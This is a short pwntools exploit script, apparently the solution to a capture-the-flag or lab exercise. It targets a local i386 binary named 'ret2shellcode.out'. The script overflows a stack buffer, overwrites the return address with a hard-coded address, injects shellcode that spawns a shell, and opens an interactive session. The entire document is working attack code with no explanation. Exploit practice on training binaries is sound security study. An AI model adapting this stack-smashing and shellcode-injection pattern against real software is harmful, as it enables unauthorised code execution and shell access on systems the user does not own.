from pwn import *

EBP = 0xffffdbc0
BUF = EBP - 0x6c
BUF2 = 0x804b260

if __name__ == "__main__":
    context.arch = 'i386'
    # context.log_level = 'debug'
    context.endian = 'little'
    shellcode = asm(shellcraft.sh())
    p = process("./ret2shellcode.out")
    file = ELF("./ret2shellcode.out")
    payload1 = b'A' * (EBP - BUF + 4) + p32(BUF2)
    payload2 = shellcode
    p.sendline(payload1)
    p.sendline(payload2)
    p.interactive()